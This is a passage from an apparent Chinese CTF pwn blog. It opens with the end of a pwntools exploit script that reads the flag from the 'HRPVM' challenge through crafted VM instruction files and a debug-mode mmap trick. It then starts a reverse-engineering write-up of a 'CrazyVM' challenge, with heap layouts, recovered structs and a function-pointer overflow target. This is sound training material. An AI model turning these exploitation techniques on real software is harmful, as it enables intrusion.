class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./HRPVM&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x248E)\nb *$rebase(0x220B)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;./&quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;FILE NAME: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;FILE CONTENT: &quot;</span>,data)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;rm &quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]HOLDER:&quot;</span>,<span class="string">&quot;YHELLOW&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;mov rdi,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rsi,36;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rdx,1001;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rax,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;call write,1;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">&quot;mov rdi,35;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rsi,0;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;call open,2;&quot;</span></span><br><span class="line"></span><br><span class="line">payload3 =  <span class="string">&quot;mov rdi,36;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;mov rsi,1001;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;call open,2;&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;write&quot;</span>,payload)</span><br><span class="line">add(<span class="string">&quot;open&quot;</span>,payload2)</span><br><span class="line">add(<span class="string">&quot;open2&quot;</span>,payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i),<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;open&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;file input&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;FILE NAME:&quot;</span>,<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;mmap&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x560000000000</span>))</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;exit&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;reboot&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]HOLDER:&quot;</span>,p64(<span class="number">0x560000000000</span>))</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;open2&quot;</span>)</span><br><span class="line">pwn(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/22/VM%20pwn+exit_hook%E5%8A%AB%E6%8C%81+mmap%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/22/VM%20pwn+exit_hook%E5%8A%AB%E6%8C%81+mmap%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+exit_hook劫持+mmap溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-22 03:15:19 / Modified: 03:17:50" itemprop="dateCreated datePublished" datetime="2023-06-22T03:15:19+08:00">2023-06-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>CrazyVM</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CrazyVM: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=db8e268984b1b742f3813cdb5662ef47af09628d, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>程序分析</strong></p>
<p>首先程序没法控制 malloc free 应该不是打堆，Full RELRO 打不了 GOT 表，另外程序也没有一些特殊字符串和类似于 strcmp 之类的函数</p>
<p>上述这些特点说明：本程序需要逆向虚拟机指令格式，猜测应该是自定义了一个虚拟机指令格式，我们需要逆向该指令格式并找到漏洞（漏洞点极有可能是溢出）</p>
<ul>
<li>虚拟机有两种实现方式：<ul>
<li>一种是将虚拟机字节码翻译为 ELF 指令，然后交给 CPU 运行（这种通常要打 shellcode）</li>
<li>一种是在虚拟机内部实现各个指令的函数，通过这些函数模拟指令执行的过程（这种通常要注意溢出漏洞）</li>
</ul>
</li>
</ul>
<p>随便输入点数据试试程序结构：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;1111&quot;</span></span><br><span class="line">data = <span class="string">&quot;2222&quot;</span></span><br><span class="line">sla(<span class="string">&quot;input code for vm: &quot;</span>,code)</span><br><span class="line">sla(<span class="string">&quot;input data for vm: &quot;</span>,data)</span><br></pre></td></tr></table></figure>
<p>在 GDB 中调试分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55d73e8fe290</span>      <span class="number">0x0</span>                 <span class="number">0x170</span>		<span class="comment">/* info */</span></span><br><span class="line"><span class="number">0x55d73e8fe400</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>		<span class="comment">/* node */</span></span><br><span class="line"><span class="number">0x55d73e8fe420</span>      <span class="number">0x55d73e8fe430</span>      <span class="number">0x10010</span> 	<span class="comment">/* data */</span></span><br><span class="line"><span class="number">0x55d73e90e430</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>		<span class="comment">/* node */</span>   </span><br><span class="line"><span class="number">0x55d73e90e450</span>      <span class="number">0x7fa93f84f010</span>      <span class="number">0x20</span> 		<span class="comment">/* node */</span>               </span><br></pre></td></tr></table></figure>
<ul>
<li>整体堆布局：核心控制信息 info，3个次要信息 node，1个缓冲区</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e8fe2a0</span> <span class="comment">/* INFO */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rdi <span class="number">0x55d73e8fe2a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓            <span class="number">7</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55d73e8fe2e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55d73e8fe320</span> ◂— <span class="number">0x7f00000000080000</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x55d73e8fe328</span> ◂— <span class="number">0x7f00000000080000</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x55d73e8fe330</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x55d73e8fe338</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55d73e8fe340</span> —▸ <span class="number">0x55d73e8fe410</span> ◂— <span class="number">0x0</span> <span class="comment">/* NODE-code */</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x55d73e8fe348</span> —▸ <span class="number">0x55d73e90e440</span> ◂— <span class="number">0x7f00000000000000</span> <span class="comment">/* NODE-fini */</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x55d73e8fe350</span> —▸ <span class="number">0x55d73e90e460</span> ◂— <span class="number">0x5000000000000000</span> <span class="comment">/* NODE-data */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55d73e8fe358</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0x55d73e8fe360</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">20</span>:<span class="number">0100</span>│  <span class="number">0x55d73e8fe3a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│  <span class="number">0x55d73e8fe3e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br></pre></td></tr></table></figure>
<ul>
<li>Chunk + 21*8 的位置有3个 chunk 指针</li>
<li>分析出第1个 chunk 用于管理 code，第3个 chunk 用于管理 data</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e8fe400</span> <span class="comment">/* NODE-code */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55d73e8fe400</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55d73e8fe408</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55d73e8fe410</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55d73e8fe418</span> ◂— <span class="number">0x10000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55d73e8fe420</span> —▸ <span class="number">0x55d73e8fe430</span> ◂— <span class="number">0xa31313131</span> <span class="comment">/* &#x27;1111\n&#x27; */</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e90e430</span> <span class="comment">/* NODE-fini */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55d73e90e430</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55d73e90e438</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55d73e90e440</span> ◂— <span class="number">0x7f00000000000000</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55d73e90e448</span> ◂— <span class="number">0x100000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55d73e90e450</span> —▸ <span class="number">0x7fa93f84f010</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e90e450</span> <span class="comment">/* NODE-data */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55d73e90e450</span> —▸ <span class="number">0x7fa93f84f010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55d73e90e458</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55d73e90e460</span> ◂— <span class="number">0x5000000000000000</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55d73e90e468</span> ◂— <span class="number">0x20000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55d73e90e470</span> —▸ <span class="number">0x7fa93f82e010</span> ◂— <span class="number">0xa32323232</span> <span class="comment">/* &#x27;2222\n&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>目前不知道第2个 chunk 的信息</li>
<li>PS：由于 size 过大，导致 calloc 调用了 mmap</li>
</ul>
<p>通过调试分析可以初步提取出如下两个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Info struc ; (<span class="keyword">sizeof</span>=<span class="number">0x180</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> buf dq <span class="number">16</span> dup(?)</span><br><span class="line"><span class="number">00000080</span> temp_base dq ?</span><br><span class="line"><span class="number">00000088</span> data_base dq ?</span><br><span class="line"><span class="number">00000090</span> code_base dq ?</span><br><span class="line"><span class="number">00000098</span> field_98 dq ?</span><br><span class="line"><span class="number">000000</span>A0 node_code dq ?                          ; offset</span><br><span class="line"><span class="number">000000</span>A8 node_temp dq ?                          ; offset</span><br><span class="line"><span class="number">000000B</span>0 node_data dq ?                          ; offset</span><br><span class="line"><span class="number">000000B</span>8 field_B8 dq ?</span><br><span class="line"><span class="number">000000</span>C0 field_C0 dq ?</span><br><span class="line"><span class="number">000000</span>C8 field_C8 dq ?</span><br><span class="line"><span class="number">000000</span>D0 field_D0 dq ?</span><br><span class="line"><span class="number">000000</span>D8 field_D8 dq ?</span><br><span class="line"><span class="number">000000E0</span> field_E0 dq ?</span><br><span class="line"><span class="number">000000E8</span> field_E8 dq ?</span><br><span class="line"><span class="number">000000F</span>0 field_F0 dq ?</span><br><span class="line"><span class="number">000000F</span>8 field_F8 dq ?</span><br><span class="line"><span class="number">00000100</span> field_100 dq ?</span><br><span class="line"><span class="number">00000108</span> field_108 dq ?</span><br><span class="line"><span class="number">00000110</span> field_110 dq ?</span><br><span class="line"><span class="number">00000118</span> field_118 dq ?</span><br><span class="line"><span class="number">00000120</span> key db ?</span><br><span class="line"><span class="number">00000121</span> db ? ; undefined</span><br><span class="line"><span class="number">00000122</span> db ? ; undefined</span><br><span class="line"><span class="number">00000123</span> db ? ; undefined</span><br><span class="line"><span class="number">00000124</span> db ? ; undefined</span><br><span class="line"><span class="number">00000125</span> db ? ; undefined</span><br><span class="line"><span class="number">00000126</span> db ? ; undefined</span><br><span class="line"><span class="number">00000127</span> db ? ; undefined</span><br><span class="line"><span class="number">00000128</span> code dq ?</span><br><span class="line"><span class="number">00000130</span> key2 db ?</span><br><span class="line"><span class="number">00000131</span> db ? ; undefined</span><br><span class="line"><span class="number">00000132</span> db ? ; undefined</span><br><span class="line"><span class="number">00000133</span> db ? ; undefined</span><br><span class="line"><span class="number">00000134</span> db ? ; undefined</span><br><span class="line"><span class="number">00000135</span> db ? ; undefined</span><br><span class="line"><span class="number">00000136</span> db ? ; undefined</span><br><span class="line"><span class="number">00000137</span> db ? ; undefined</span><br><span class="line"><span class="number">00000138</span> t_rsi dq ?</span><br><span class="line"><span class="number">00000140</span> t_rdx dq ?</span><br><span class="line"><span class="number">00000148</span> t_rcx dq ?</span><br><span class="line"><span class="number">00000150</span> t_r8 dq ?</span><br><span class="line"><span class="number">00000158</span> func dq ?                               ; offset</span><br><span class="line"><span class="number">00000160</span> key3 db ?</span><br><span class="line"><span class="number">00000161</span> db ? ; undefined</span><br><span class="line"><span class="number">00000162</span> db ? ; undefined</span><br><span class="line"><span class="number">00000163</span> db ? ; undefined</span><br><span class="line"><span class="number">00000164</span> db ? ; undefined</span><br><span class="line"><span class="number">00000165</span> db ? ; undefined</span><br><span class="line"><span class="number">00000166</span> db ? ; undefined</span><br><span class="line"><span class="number">00000167</span> db ? ; undefined</span><br><span class="line"><span class="number">00000168</span> field_168 dq ?</span><br><span class="line"><span class="number">00000170</span> field_170 dq ?</span><br><span class="line"><span class="number">00000178</span> field_178 dq ?</span><br><span class="line"><span class="number">00000180</span> Info ends</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Node struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span> base dq ?</span><br><span class="line"><span class="number">00000008</span> size dq ?</span><br><span class="line"><span class="number">00000010</span> chunk dq ?                              ; offset</span><br><span class="line"><span class="number">00000018</span> Node ends</span><br></pre></td></tr></table></figure>
<p>在函数 hand_key 中有非常复杂的 Switch-case 结构，猜测程序在这里完成指令执行的工作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">  <span class="keyword">if</span> ( !op1 || op1 == <span class="number">2</span> || op1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr-&gt;key2 = <span class="number">1</span>;</span><br><span class="line">    ptr-&gt;func = sub_176C;</span><br><span class="line">    ptr-&gt;r_rdi = op1;</span><br><span class="line">    ptr-&gt;r_rsi = op2;</span><br><span class="line">    ptr-&gt;r_rdx = BYTE3(ptr-&gt;code);</span><br><span class="line">    ptr-&gt;r_rcx = (<span class="keyword">unsigned</span> __int8)BYTE4(ptr-&gt;code);</span><br><span class="line">    re = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每一个 case，程序都设计了一个函数来完成其功能</li>
<li>这里只能断点调试，通过输入值和返回值来判断该函数的功能</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000</span>D77D <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000</span>D781 <span class="number">48</span> <span class="number">8B</span> B0 <span class="number">38</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          mov     rsi, [rax+<span class="number">138</span>h]</span><br><span class="line">.text:<span class="number">000000000000</span>D788 <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000</span>D78C <span class="number">49</span> <span class="number">89</span> F8                      mov     r8, rdi</span><br><span class="line">.text:<span class="number">000000000000</span>D78F <span class="number">48</span> <span class="number">89</span> C7                      mov     rdi, rax</span><br><span class="line">.text:<span class="number">000000000000</span>D792 <span class="number">41</span> FF D1                      call    r9</span><br></pre></td></tr></table></figure>
<ul>
<li>程序会运行一个函数指针</li>
</ul>
<p>该程序的漏洞极有可能是堆溢出（覆盖函数指针），但程序对 op3-offset 进行了限制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( op1 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( BYTE3(ptr-&gt;code) &lt;= <span class="number">0x11</span>uLL )</span><br><span class="line">      <span class="keyword">goto</span> <span class="literal">true</span>;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span 